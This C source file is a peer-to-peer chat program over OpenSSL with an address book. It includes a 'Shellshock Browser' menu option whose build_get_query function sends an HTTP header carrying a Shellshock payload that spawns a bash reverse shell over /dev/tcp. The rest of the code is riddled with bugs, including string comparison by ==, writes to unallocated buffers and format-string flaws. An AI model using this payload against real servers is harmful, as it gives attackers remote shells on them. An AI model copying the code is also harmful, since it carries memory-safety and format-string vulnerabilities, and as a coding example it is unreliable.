#include <stdio.h>
#include <memory.h>
#include <error.h>
#include <stdlib.h>
#ifdef __WIN32__
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#endif
#include <pthread.h>
#include <stdbool.h>
#include <openssl/rsa.h>
#include <openssl/crypto.h>
#include <openssl/tls1.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define DIM 20

struct person {
    char *name;
    char *surname;
    char *ip;
    char *number;
};

typedef struct person Person;

const char* Versionx() {
#ifdef VERSION
  return VERSION;
#else
  return "";
#endif
}

int action;
bool Done = false;

char *SendBuffer;
int BytesReceived;
char *Buffer;

void *connection_handler(void *socket_desc);
void *connection_handler1(void *socket_desc);
void *connection_handler2(void *socket_desc);
char *get_ip(char *host);
char *build_get_query(char *host, char *page);
int create_tcp_socket();
int books(void);
int books2(void);

void iam()
{
  	  printf("\t\t.------..------..------..------..------..------.\n");
	  printf("\t\t|S.--. ||M.--. ||I.--. ||R.--. ||I.--. ||L.--. |\n");
	  printf("\t\t| :  : || :  : || :  : || :  : || :  : || :  : |\n");
	  printf("\t\t| '--' || '--' || '--' || '--TO|| '--OL|| '--'S|\n");
	  printf("\t\t`------'`------'`------'`------'`------'`------'\n");
	  printf("\t\t Peer-Chat OpenSSL (Windows/Linux)  Version 1.1 \n");
	  printf("%s \n",Versionx());
}

char * getline2(void) {
    char * line = malloc(100), * linep = line;
    size_t lenmax = 100, len = lenmax;
    int c;

    if(line == NULL)
        return NULL;

    for(;;) {
        c = fgetc(stdin);
        if(c == EOF)
            break;

        if(--len == 0) {
            len = lenmax;
            char * linen = realloc(linep, lenmax *= 2);

            if(linen == NULL) {
                free(linep);
                return NULL;
            }
            line = linen + (line - linep);
            linep = linen;
        }

        if((*line++ = c) == '\n')
            break;
    }
    *line = '\0';
    return linep;
}

#ifdef __WIN32__
int inet_pton(int af, const char *src, void *dst)
{
  struct sockaddr_storage ss;
  int size = sizeof(ss);
  char src_copy[INET6_ADDRSTRLEN+1];

  ZeroMemory(&ss, sizeof(ss));
  /* stupid non-const API */
  strncpy (src_copy, src, INET6_ADDRSTRLEN+1);
  src_copy[INET6_ADDRSTRLEN] = 0;

  if (WSAStringToAddress(src_copy, af, NULL, (struct sockaddr *)&ss, &size) == 0) {
    switch(af) {
      case AF_INET:
    *(struct in_addr *)dst = ((struct sockaddr_in *)&ss)->sin_addr;
    return 1;
      case AF_INET6:
    *(struct in6_addr *)dst = ((struct sockaddr_in6 *)&ss)->sin6_addr;
    return 1;
    }
  }
  return 0;
}

const char *inet_ntop(int af, const void *src, char *dst, socklen_t size)
{
  struct sockaddr_storage ss;
  unsigned long s = size;

  ZeroMemory(&ss, sizeof(ss));
  ss.ss_family = af;

  switch(af) {
    case AF_INET:
      ((struct sockaddr_in *)&ss)->sin_addr = *(struct in_addr *)src;
      break;
    case AF_INET6:
      ((struct sockaddr_in6 *)&ss)->sin6_addr = *(struct in6_addr *)src;
      break;
    default:
      return NULL;
  }
  /* cannot direclty use &size because of strict aliasing rules */
  return (WSAAddressToString((struct sockaddr *)&ss, sizeof(ss), NULL, dst, &s) == 0)?
          dst : NULL;
}
#endif

#define USERAGENT "Mozilla/5.0 (iPad; CPU OS 10_1_3 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602."

#ifdef __WIN32__
#define HOME "C:\\Users\\"
#else
#define HOME "/home/"
#endif

#define CERTF HOME "valid-root-ca.pem"
#define KEYF HOME "valid-root-cakey.pem"

int err;
int sd;
int socket_desc,sock2,*new_sock;
struct sockaddr_in serv_addr;
socklen_t client_len;
SSL_CTX* ctx;
SSL* ssl;
X509* client_cert;
X509* server_cert;
char* str;
char *jessy0,*jessy1,*jessy2,*jessy3;
char *cora;
#ifdef __WIN32__
		SSL_METHOD *meth;
#else
		const SSL_METHOD *meth;
#endif



#define CHK_NULL(x) if (((void*)x)==NULL) exit (1)
#define CHK_ERR(err,s) if((err)==-1) {perror(s);exit(1);}
#define CHK_SSL(err) if ((err)==-1){ERR_print_errors_fp(stderr); exit(2);}

struct sockaddr_in *remote;
int tmpres;
char *ip;
char *get;
char buf[BUFSIZ+1];
char *host;
char *page;
char *port;
char *service;
pthread_t sniffer_thread;

int thread0(void){
	new_sock = (int*)malloc(1);
	*new_sock = create_tcp_socket();
	
	if(pthread_create(&sniffer_thread,NULL,connection_handler,(void*) *new_sock) < 0){
		perror("could not create thread");
		return 1;
	}
	
	pthread_join(sniffer_thread,NULL);
}

int thread1(void){	
		new_sock = (int*)malloc(1);
		*new_sock = create_tcp_socket(); 
		if(pthread_create(&sniffer_thread,NULL,connection_handler1,(void*) *new_sock) < 0){
			perror("could not create thread");
			return 1;
		}
	
		pthread_join(sniffer_thread,NULL);   	
}

int thread2(void){
		new_sock = (int*)malloc(1);
		*new_sock = create_tcp_socket(); 
		if(pthread_create(&sniffer_thread,NULL,connection_handler2,(void*) *new_sock) < 0){
			perror("could not create thread");
			return 1;
		}
	
		pthread_join(sniffer_thread,NULL);	
}

int main(int argc, char **argv)
{
	Start:

 	iam();
	printf("\n\t\t\tWhat you want to do:\n\t\t\t1.) ChatServer\t\t6.) Shellshock Browser\n\t\t\t2.) ChatClient\n\t\t\t\x1b[33m3.) Addressbook Entry\x1b[0m\n\t\t\t4.) Print Addressbook\n\t\t\t5.) Exit\t\t");
    scanf("%c",&action);
    
	switch(action){

    case '1':
	printf("PORT: \x1B[32m");
	getchar();
	port = getline2();
	printf("\x1b[0m");   	
	  thread1();
	  break;
    case '2':
	printf("PORT: \x1B[32m");
	getchar();
	port = getline2();
	printf("\x1b[0m");
	printf("HOST: \x1B[32m");
	getchar();
	host = getline2();    	
	printf("\x1b[0m");
	  thread2();
        break;
    case'3':
    	books();
    	goto Start;
    	break;
    case'4':
    	books2();
    	goto Start;
    	break;
    case'5':
    	printf("\n");
    	iam();
      return 0;
        break;
    case '6':
	printf("HOST: \x1B[32m");
	getchar();
	host = getline2();
	printf("\x1b[0m");
	printf("PAGE: \x1B[32m");
	getchar();
	page = getline2();    	
	printf("\x1b[0m");
	printf("PORT: \x1B[32m");
	getchar();
	port = getline2();
	printf("\x1b[0m");
	printf("SERVICE: \x1B[32m");
	getchar();
	service = getline2();
	printf("\x1b[0m");
	  thread0();
	  goto Start;
        break;
	default:
		goto Start;
		break;
	}

	return 0;
}

int books(void) {
		Person* person = calloc (DIM, sizeof(Person));
		char* buffer = 0;

		FILE *fp;
		fp = fopen("test.book","a+");
		if (!fp)
		{
			printf("Unable to open file!");
			return 1;
		}
				
		buffer = malloc ( 150 );
		memset(buffer,0,150);
    	printf("Insert name: ");
    	getchar();
    	person->name = getline2 ();
    	printf("Insert surname: ");
    	getchar();
		person->surname = getline2();
    	printf("Insert IP: ");
    	getchar();
		person->ip = getline2();
    	printf("Insert phone number: ");
    	getchar();
		person->number = getline2();
		snprintf( buffer, 150, "%s%s%s%s\n",person->name,person->surname,person->ip,person->number);
		fputs(buffer,  fp);
		free( buffer );
		
		fclose(fp);	    
}
int books2(void) {
	    Person* person = calloc (DIM, sizeof(Person));
        printf("\n\nPRINTING ADDRESS BOOK...\n\n");
		FILE *fp;
		const char s[3] = " ";
		char line[200];
    	char *token;
		fp=fopen("test.book","r");
		if (!fp)
		{
			printf("Unable to open file!");
			return 1;
		}
		
		for(int i=1; i <= DIM;i++){
		
			fgets(line, sizeof(line), fp);

   			token = strtok(line, s);

   /* walk through other tokens */
   			while( token != NULL )
   			{
      			printf( "%s", token );

      			token = strtok(NULL, s);
   			}
					
    	}

		fclose(fp);
}

void *connection_handler(void *socket_desc){
	if(service == "https"){
		SSL_load_error_strings();
		OpenSSL_add_ssl_algorithms();
		meth = TLSv1_client_method();
		ctx = SSL_CTX_new((void*)meth);
		CHK_NULL(ctx);
		
		if(!ctx){
			printf("There's NO Crypto Method choosen\n");
			exit(2);
		}
		
		if(SSL_CTX_load_verify_locations(ctx,CERTF,HOME) <= 0){
			printf("Verify of the Cert FAILED!\n");
			exit(3);
		}
		
		if(SSL_CTX_use_certificate_file(ctx,CERTF,SSL_FILETYPE_PEM) <= 0){
			printf("PEM Cert File is NOT Valid\n");
			exit(4);
		}
		
		if(SSL_CTX_use_PrivateKey_file(ctx,KEYF,SSL_FILETYPE_PEM) <= 0){
			printf("PEM CertKey File is NOT Valid\n");
			exit(5);
		}
		
		if(SSL_CTX_check_private_key(ctx)){
			printf("Private does not match the public key!\n");
			exit(6);
		}
	}
	
  sock2 = *(int*)new_sock;
  ip = get_ip(host);
  fprintf(stderr, "IP is %s\n", ip);
  remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
  remote->sin_family = AF_INET;
  tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
  if( tmpres < 0)  
  {
    perror("Can't set remote->sin_addr.s_addr");
    exit(1);
  }else if(tmpres == 0)
  {
    fprintf(stderr, "%s is not a valid IP address\n", ip);
    exit(1);
  }
  remote->sin_port = htons(atoi(port));
 
  if(connect(sock2, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0){
    perror("Could not connect");
    exit(0);
  }
  
  if(service == "https"){
  	ssl = SSL_new(ctx);
  	CHK_NULL(ssl);
  	SSL_set_fd(ssl,sock2);
  	err = SSL_connect(ssl);
  	CHK_SSL(err);
  	printf("SSL Connection using %s \n",SSL_get_cipher(ssl));
  	server_cert = SSL_get_peer_certificate(ssl);
  	CHK_NULL(server_cert);
  	str = X509_NAME_oneline(X509_get_subject_name(server_cert),0,0);
  	CHK_NULL(str);
  	printf("\t subject: %s\n",str);
  	OPENSSL_free(str);
  	X509_free(server_cert);
  }
  
  get = build_get_query(host, page);
  fprintf(stderr, "Query is:\n<<START>>\n%s<<END>>\n", get);
 
  //Send the query to the server
  int sent = 0;
  if(service == "https"){
  while(sent < strlen(get)){
  	tmpres = SSL_write(ssl,get+sent,strlen(get)-sent);
  	if(tmpres == -1){
  		perror("can not send query");
  		exit(1);
	  }
  	}
  }
  
  if(service == "http"){
  while(sent < strlen(get))
  {
    tmpres = send(sock2, get+sent, strlen(get)-sent, 0);
    if(tmpres == -1){
      	perror("Can't send query");
      	exit(1);
    	}
    	sent += tmpres;
  	}
  }
  
  //now it is time to receive the page
  memset(buf, 0, sizeof(buf));
  int htmlstart = 0;
  char * htmlcontent;
    struct timeval timeout;      
    timeout.tv_sec = 120;
    timeout.tv_usec = 0;

    if (setsockopt (sock2, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        perror("setsockopt failed\n");}

    if (setsockopt (sock2, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        perror("setsockopt failed\n");}

	if(service == "https"){
		while((tmpres = SSL_read(ssl,buf,BUFSIZ)) > 0){
			if(htmlstart == 0){
				htmlcontent = strstr(buf,"\r\n\r\n");
				htmlstart = 1;
				htmlcontent += 4;
			}else{
				htmlcontent = buf;
			}
			
			if(htmlstart){
				fprintf(stdout,htmlcontent);
			}
			
			memset(buf,0,tmpres);
			
			if(tmpres < 0){
				perror("Error reciving data");
			}
		}
	}
	
	if(service == "http"){
		while((tmpres = recv(sock2,buf,BUFSIZ,0)) < 0){
			if(htmlstart == 0){
				htmlcontent = strstr(buf,"\r\n");
				
				if(htmlcontent != NULL){
					htmlstart = 1;
					htmlcontent += 4;
				}else{
					htmlcontent = buf;
				}
				
				if(htmlstart){
					fprintf(stdout,htmlcontent);
				}
				
				memset(buf,0,tmpres);
				
			}
			
			if(tmpres < 0){
				perror("error reciving data");
			}
		}
	}
	
	if(service == "https"){
		SSL_shutdown(ssl);
#ifdef __WIN32__
		closesocket(sock2);
		WSACleanup();
#else
		close(sock2);
#endif
		SSL_free(ssl);
		SSL_CTX_free(ctx);
	}
	
	if(service == "http"){
#ifdef __WIN32__
		closesocket(sock2);
		WSACleanup();
#else
		close(sock2);
#endif	
	}
  	iam();
  
  return 0;
}

void *connection_handler1(void *socket_desc){  
    int client_sock;
  /* SSL preliminaries. We keep the certificate and key with the context. */

    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    meth = TLSv1_server_method();
    ctx = SSL_CTX_new (meth);
    CHK_NULL(ctx);
    /* ----------------------------------------------- */
    /* Load , Verify and use CERTF and KEYF for encrypt the connection */
    if (!ctx) {
    perror ("There's NO Crypto Method choosen\n");
    exit(2);
    }
  
    if (SSL_CTX_load_verify_locations(ctx,CERTF,HOME) <= 0) {
    perror ("Verify of the Cert FAILED!\n");
    exit(3);
    }
  
    if (SSL_CTX_use_certificate_file(ctx, CERTF, SSL_FILETYPE_PEM) <= 0) {
    perror ("PEM Cert File is NOT Valid\n");
    exit(4);
    }
  
    if (SSL_CTX_use_PrivateKey_file(ctx, KEYF, SSL_FILETYPE_PEM) <= 0) {
    perror ("PEM CertKey File is NOT Valid\n");
    exit(5);
    }

    if (!SSL_CTX_check_private_key(ctx)) {
    perror ("Private key does not match the certificate public key\n");
    exit(6);
    }
  /* ----------------------------------------------- */
  /* Prepare TCP socket for receiving connections */
    //Create socket
    sock2 = *(int*)new_sock;
    if (sock2 < 0)
    {
        printf("Could not create socket");
    }
    puts("Socket created");

    memset(&serv_addr, 0, sizeof(serv_addr));
    //printf("\nPORT: ");
	//getchar();
	//scanf("%d",&port);
    //Prepare the sockaddr_in structure
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(atoi(port));
    
	if (bind(sock2, (struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) {
              perror("ERROR on binding");
			  }
    
    puts("bind done");
    //TODO: Insert daemon code here.
     //Listen
    listen(sock2 , 5);
    client_len = sizeof(serv_addr);
    //while (1)
    //{
 
  /* --------------------------------------------------- */
    //Accept and incoming connection
    puts("Waiting for Connections ...");
    while(client_sock = accept(sock2, (struct sockaddr*) &serv_addr, &client_len ) )
    {
      puts("Connection accepted");
 
  /* Now we have TCP conncetion. Start SSL negotiation. */
  
      ssl = SSL_new(ctx);
      CHK_NULL(ssl);
      SSL_set_fd(ssl, sd);
      err = SSL_accept(ssl);
      CHK_SSL(err);
      
  /* Get the cipher - opt */
  
     snprintf(jessy0,512,"SSL connection using %s\n", SSL_get_cipher (ssl));

  /* Get client's certificate (note: beware of dynamic allocation) - opt */

     client_cert = SSL_get_peer_certificate(ssl);
    
     if (client_cert != NULL) {
     snprintf(jessy1,512,"Client certificate: \n");
    
     str = X509_NAME_oneline (X509_get_subject_name(client_cert), 0, 0);
     CHK_NULL(str);
     snprintf(jessy2,512,"subject: %s\n", str);
     OPENSSL_free(str);
   
     str = X509_NAME_oneline (X509_get_issuer_name(client_cert), 0, 0);
     CHK_NULL(str);
     snprintf(jessy3,512,"issuer: %s\n", str);
     OPENSSL_free(str);
    
    /* We could do all sorts of certificate verification stuff here before
       deallocating the certificate. */
    
     X509_free(client_cert);
  } else{
     snprintf(cora,512,"Client does not have certificate.\n");
    }
     
    if (client_sock < 0)
    {
        perror("accept failed");
        exit(0);
	}
           
           printf("connected\n");
           printf("waiting for message...\n");
           //SERVER MESSAGING
           while(Done == false)
           {
            BytesReceived = 0;
            while(BytesReceived == 0)
            {
              BytesReceived = SSL_read(ssl,Buffer,strlen(Buffer));  
            }
            printf("%s\n",Buffer);
            getchar();
            SendBuffer = getline2();
			//fgets(SendBuffer, 128, stdin);
            SSL_write(ssl,SendBuffer,strlen(SendBuffer));
           }
           //END OF SERVER MESSAGING
       }
		SSL_shutdown(ssl);
#ifdef __WIN32__
		closesocket(sock2);
		WSACleanup();
#else
		close(sock2);
#endif
		SSL_free(ssl);
		SSL_CTX_free(ctx);
		iam();
		
	return 0;
}

void *connection_handler2(void *socket_desc){  
    	SSL_load_error_strings();
		OpenSSL_add_ssl_algorithms();
		meth = TLSv1_client_method();
		ctx = SSL_CTX_new((void*)meth);
		CHK_NULL(ctx);
		
		if(!ctx){
			printf("There's NO Crypto Method choosen\n");
			exit(2);
		}
		
		if(SSL_CTX_load_verify_locations(ctx,CERTF,HOME) <= 0){
			printf("Verify of the Cert FAILED!\n");
			exit(3);
		}
		
		if(SSL_CTX_use_certificate_file(ctx,CERTF,SSL_FILETYPE_PEM) <= 0){
			printf("PEM Cert File is NOT Valid\n");
			exit(4);
		}
		
		if(SSL_CTX_use_PrivateKey_file(ctx,KEYF,SSL_FILETYPE_PEM) <= 0){
			printf("PEM CertKey File is NOT Valid\n");
			exit(5);
		}
		
		if(SSL_CTX_check_private_key(ctx)){
			printf("Private key does not match the certificate public key\n");
			exit(6);
		}

	
  sock2 = *(int*)new_sock;
  ip = get_ip(host);
  fprintf(stderr, "IP is %s\n", ip);
  remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
  remote->sin_family = AF_INET;
  tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
  if( tmpres < 0)  
  {
    perror("Can't set remote->sin_addr.s_addr");
    exit(1);
  }else if(tmpres == 0)
  {
    fprintf(stderr, "%s is not a valid IP address\n", ip);
    exit(1);
  }
  remote->sin_port = htons(atoi(port));
 
  if(connect(sock2, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0){
    perror("Could not connect");
    exit(0);
  }
  	ssl = SSL_new(ctx);
  	CHK_NULL(ssl);
  	SSL_set_fd(ssl,sock2);
  	err = SSL_connect(ssl);
  	CHK_SSL(err);
  	printf("SSL Connection using %s \n",SSL_get_cipher(ssl));
  	server_cert = SSL_get_peer_certificate(ssl);
  	CHK_NULL(server_cert);
  	str = X509_NAME_oneline(X509_get_subject_name(server_cert),0,0);
  	CHK_NULL(str);
  	printf("\t subject: %s\n",str);
  	OPENSSL_free(str);
  	X509_free(server_cert);
                struct timeval timeout;      
    			timeout.tv_sec = 120;
    			timeout.tv_usec = 0;

    			if (setsockopt (sock2, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        			perror("setsockopt failed\n");}

    			if (setsockopt (sock2, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        			perror("setsockopt failed\n");}
        			
           printf("Connected to Server.\n");
           printf("Enter your message.\n");
           //CLIENT MESSAGING
           while(Done == false)
           {
             BytesReceived = 0;
            getchar();
            SendBuffer = getline2();
             SSL_write(ssl,SendBuffer,strlen(SendBuffer));
             while(BytesReceived == 0)
             {
               BytesReceived = SSL_read(ssl,Buffer,strlen(Buffer));
             }
             printf("%s\n",Buffer); 
           }
           //END OF CLIENT MESSAGING
		SSL_shutdown(ssl);
#ifdef __WIN32__
		closesocket(sock2);
		WSACleanup();
#else
		close(sock2);
#endif
		SSL_free(ssl);
		SSL_CTX_free(ctx);
		iam();
		
	return 0;
}

int create_tcp_socket()
{
  int socket_desc;
#ifdef __WIN32__
    WSADATA wsa;
    SOCKET s;
 
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
     
    printf("Initialised.\n");
#endif
  if((socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
    perror("Can't create TCP socket");
    exit(1);
  }
  return socket_desc;
}
 
 
char *get_ip(char *host)
{
  struct hostent *hent;
  int iplen = 15; //XXX.XXX.XXX.XXX
  char *ip = (char *)malloc(iplen+1);
  memset(ip, 0, iplen+1);
  if((hent = gethostbyname(host)) == NULL)
  {
    perror("Can't get IP");
    exit(1);
  }
  if(inet_ntop(AF_INET, (void *)hent->h_addr_list[0], ip, iplen) == 0)
  {
    perror("Can't resolve host");
    exit(1);
  }
  return ip;
}

char *build_get_query(char *host, char *page)
{
  char *query;
  char *getpage = page;
  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/127.0.0.1/8080 0>&1 : Connection: close:\r\n\r\n";
  
  if(getpage[0] == '/'){
    getpage = getpage + 1;
  
  }
  // -5 is to consider the %s %s %s in tpl and the ending \0
  
  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(tpl)-5);
  
  sprintf(query, tpl, getpage, host, USERAGENT);
  
  return query;
}
